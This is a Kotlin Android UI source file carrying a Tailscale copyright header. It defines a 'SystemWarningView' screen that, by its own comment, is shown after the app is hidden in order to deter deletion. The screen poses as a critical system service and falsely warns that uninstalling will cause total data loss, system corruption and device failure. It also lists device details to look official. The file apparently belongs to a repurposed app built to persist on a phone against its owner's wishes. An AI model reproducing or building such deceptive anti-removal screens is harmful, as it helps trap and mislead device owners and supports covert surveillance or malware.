// Copyright (c) Tailscale Inc & AUTHORS
// SPDX-License-Identifier: BSD-3-Clause

package com.tailscale.ipn.ui.view

import android.os.Build
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

/**
 * Warning screen shown after app is "hidden" to deter deletion
 * Appears as a critical system component warning
 */
@Composable
fun SystemWarningView() {
    Surface(
        modifier = Modifier.fillMaxSize(),
        color = Color(0xFF1C1C1E) // Dark system-like background
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            // Warning Icon
            Text(
                text = "⚠️",
                fontSize = 64.sp,
                modifier = Modifier.padding(bottom = 24.dp)
            )

            // Title
            Text(
                text = "SYSTEM SERVICE",
                fontSize = 24.sp,
                fontWeight = FontWeight.Bold,
                color = Color(0xFFFFCC00), // Warning yellow
                modifier = Modifier.padding(bottom = 16.dp)
            )

            // Critical Warning
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 16.dp),
                colors = CardDefaults.cardColors(
                    containerColor = Color(0xFF2C2C2E)
                )
            ) {
                Column(
                    modifier = Modifier.padding(20.dp)
                ) {
                    Text(
                        text = "⛔ CRITICAL SYSTEM COMPONENT",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFFFF3B30), // Red
                        modifier = Modifier.padding(bottom = 12.dp)
                    )

                    Text(
                        text = "DO NOT UNINSTALL THIS APPLICATION",
                        fontSize = 14.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color.White,
                        modifier = Modifier.padding(bottom = 8.dp)
                    )

                    Text(
                        text = "This is a critical phone system service. Removing it will cause:\n\n" +
                                "• Complete loss of all phone data\n" +
                                "• Permanent system corruption\n" +
                                "• Device malfunction\n" +
                                "• Network connectivity failure\n\n" +
                                "Contact your system administrator before making any changes.",
                        fontSize = 13.sp,
                        color = Color(0xFFE0E0E0),
                        lineHeight = 20.sp
                    )
                }
            }

            // Device Info Section
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 8.dp),
                colors = CardDefaults.cardColors(
                    containerColor = Color(0xFF2C2C2E)
                )
            ) {
                Column(
                    modifier = Modifier.padding(16.dp)
                ) {
                    Text(
                        text = "System Information",
                        fontSize = 14.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFFFFCC00),
                        modifier = Modifier.padding(bottom = 8.dp)
                    )

                    DeviceInfoRow("Service Type:", "Network Manager")
                    DeviceInfoRow("Status:", "Active")
                    DeviceInfoRow("Android Version:", Build.VERSION.RELEASE)
                    DeviceInfoRow("API Level:", Build.VERSION.SDK_INT.toString())
                    DeviceInfoRow("Device Model:", Build.MODEL)
                    DeviceInfoRow("Manufacturer:", Build.MANUFACTURER)
                }
            }

            Spacer(modifier = Modifier.height(24.dp))

            Text(
                text = "This service runs in the background to maintain system integrity.",
                fontSize = 12.sp,
                color = Color(0xFF8E8E93),
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(horizontal = 16.dp)
            )
        }
    }
}

@Composable
private fun DeviceInfoRow(label: String, value: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(
            text = label,
            fontSize = 12.sp,
            color = Color(0xFF8E8E93)
        )
        Text(
            text = value,
            fontSize = 12.sp,
            color = Color.White,
            fontWeight = FontWeight.Medium
        )
    }
}
